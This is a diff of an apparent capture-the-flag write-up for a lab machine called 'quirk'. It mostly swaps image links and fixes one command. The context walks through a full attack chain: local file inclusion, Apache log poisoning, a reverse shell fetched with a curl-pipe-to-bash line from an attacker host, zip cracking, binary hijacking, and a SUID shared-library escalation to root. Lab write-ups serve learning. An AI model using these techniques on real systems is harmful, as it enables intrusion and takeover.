@@ -108,7 +108,7 @@ Found: gc._msdcs.quirk.thm (Status: 400) [Size: 422]
 
 Opening the newly discovered vhost in webbrowser, redirect us to another different page.
 
-![[Pasted image 20210819175416.png]]
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/2.PNG)
 
 Site have 4 pages
 ```
@@ -120,23 +120,23 @@ Site have 4 pages
 
 clicking work page also shows home page
 
-![[Pasted image 20210819180144.png]]
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/3.PNG)
 
 checking about me. We have another username here todoroki
 
-![[Pasted image 20210819180236.png]]
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/4.PNG)
 
 checking contact me shows this page have an email section trying xss paylods didn't work 
 
-![[Pasted image 20210819180434.png]]
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/5.PNG)
 
 When visiting work page it looks suspecious. It's shows home page also the url points to index.html local file
 
-![[Pasted image 20210819180921.png]]
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/6.PNG)
 
 So i changed the index.html to contact.html local file. luckily it shows contact.html
 
-![[Pasted image 20210819181132.png]]
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/7.PNG)
 
 Local file inclusion confirmed by /etc/passwd file.
 
@@ -198,14 +198,13 @@ curl http://beta.quirk.thm/works.php?url=works.php
 It doesn't using any filtering for input. using php wrappers caused lfi
 we have a readme.php in main domain. so i try to get the source code of readme.php but fails so the readme.php isn't present in that directory
 
-![[Pasted image 20210819182545.png]]
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/8.PNG)
 
 Using LFI to find the config files of apache shows the document root for main domain.
 
 ```bash
-curl http://beta.quirk.thm/works.php?url=../../../../etc/apache2/sites-
+curl http://beta.quirk.thm/works.php?url=../../../../etc/apache2/sites-available/000-default.conf
 
-available/000-default.conf
 <VirtualHost *:80>
         # The ServerName directive sets the request scheme, hostname and port that
         # the server uses to identify itself. This is used when creating
@@ -257,8 +256,8 @@ echo "hey Aizawa we moved our development pages to a new vhost due to U.S.J Inci
 Source code contains a comment which gives another vhost `ka.boom.quirk.thm` so add them in etc hosts. 
 visiting the vhost gives simple page shows alpha testing file. clicking it shows working
 
-![[Pasted image 20210819183809.png]]
-![[Pasted image 20210819183829.png]]
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/9.PNG)
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/10.PNG)
 
 alpha.php using file=test seems like another LFI. so test it out 
 
@@ -307,25 +306,25 @@ Yikes its using include obviously LFI and there is no filters.
 
 Well be using apache log poisoning. To get code execution capture the request in burpsuite and send them to repeater. read the apache access.log.
 
-![[Pasted image 20210819190204.png]]
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/12.PNG)
 
 replace useragent with out php payload. which will poison the log file. Then send the request
 
-![[Pasted image 20210819190600.png]]
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/13.PNG)
 
 We can append `&` with log file to execute the php script. passing whoami to the input we get result www-data successfully got code execution. 
 
-![[Pasted image 20210819190859.png]]
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/14.PNG)
 
 Created a revershell payload in local machine & used python server to transfer the payload to quirk machine and executed it. 
 
-![[Pasted image 20210819191703.png]]
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/15.PNG)
 
 Executing the curl to download our payload and pipe it to bash gives us reverse shell.
 
 `http://ka.boom.quirk.thm/alpha.php?file=/var/log/apache2/access.log&cmd=curl%20192.168.18.42:8000/rev.sh|bash`
 
-![[Pasted image 20210819191958.png]]
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/16.PNG)
 
 Stabilized shell 
 
@@ -355,20 +354,20 @@ www-data@quirk:/var/www/ka_boom$
 # www-data to user
 bakup.zip file is present in `/var/www` so i transfered it to my local machine. 
 
-![[Pasted image 20210819193137.png]]
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/17.PNG)
 
 bakup.zip file is password protected, we need to crack it first. 
 
-![[Pasted image 20210819193054.png]]
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/18.PNG)
 
 using zip2john to get the hash and cracked the hash with johntheripper. 
 `zip2john bakup.zip > zip.hash.txt`
 
-![[Pasted image 20210819193523.png]]
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/19.PNG)
 
 we cracked the password but the backup file isn't interesting it contains the backup for the webpages. the password is used for other others. Testing with every users we can switch to bakugo password reused
 
-![[Pasted image 20210819194051.png]]
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/20.PNG)
 
 user.txt is not present in bakugo home directory so we need to privesc to another user.
 sudo -l gives we can run /opt/checks as user deku. 
@@ -396,11 +395,11 @@ bakugo@quirk:~$
 
 checking strings on binary we can see it's using system and our explosion i transfered the binary to my local machine for further analysis.
 
-![[Pasted image 20210819195037.png]]
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/21.PNG)
 
 we can import it to ghidra to find what its doing. it have only one function main
 
-![[Pasted image 20210819195358.png]]
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/22.PNG)
 
 ## pseudo code from ghidra
 
@@ -418,17 +417,17 @@ undefined8 main(void)
 Exploitation is straight forward it executing explosion as deku user from bakugo home folder. we can place our malicious explosion binary to escalate from bakugo to deku
 copied the bash to bakugo home folder and renamed to explosion then executing /opt/checks run bash as deku
 
-![[Pasted image 20210819200251.png]]
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/23.PNG)
 
 We escalated our privileges to user deku. but we can't view flag it don't have permission but thats not an issues we owned the file so we can change permission.
 
-![[Pasted image 20210819200728.png]]
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/24.PNG)
 
 # deku to root
 
 A SUID binary present in deku home directory. when i check knife in gtfo bins we have a result 
 
-![[Pasted image 20210819201244.png]]
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/25.PNG)
 
 When executing it we didn't get shell 
 
@@ -441,7 +440,7 @@ deku@quirk:/home/deku$
 
 running the binary without any arguments is suggest to use `--shell` but which is also says `lol nope` seems this is the default behaviour of the binary
 
-![[Pasted image 20210819201708.png]]
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/26.PNG)
 
 Running strings to knife binary, we don't see any string like `lol nope` which is also not obfuscated.
 
@@ -554,8 +553,8 @@ undefined8 main(int param_1)
 
 checking for argument if we didn't pass any argument it prints usage, if we pass any argument it goes to nope function. but nope function isn't present in the binary. Binary isn't stripped 
 
-![[Pasted image 20210819203650.png]]
-![[Pasted image 20210819203731.png]]
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/27.PNG)
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/28.PNG)
 
 When running knife binary in local machine we get an error can't open shared object libcustom.so
 
@@ -569,7 +568,7 @@ When running knife binary in local machine we get an error can't open shared obj
 
 On quirk machine it have the custom libc for knife but we don't have in our local machine. 
 
-![[Pasted image 20210819204239.png]]
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/29.PNG)
 
 checking the permission of the libcustom.so it's  only writable by root.
 
@@ -648,6 +647,6 @@ deku@quirk:/home/deku$
 
 executing ldconfig loads library from deku home directory confirm them by ldd.
 
-![[Pasted image 20210819210257.png]]
+![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/31.PNG)
 
 Executing knife with --shell it will loads our malicious library, knife is  a SUID binary so it spawns a beautiful root shell. 
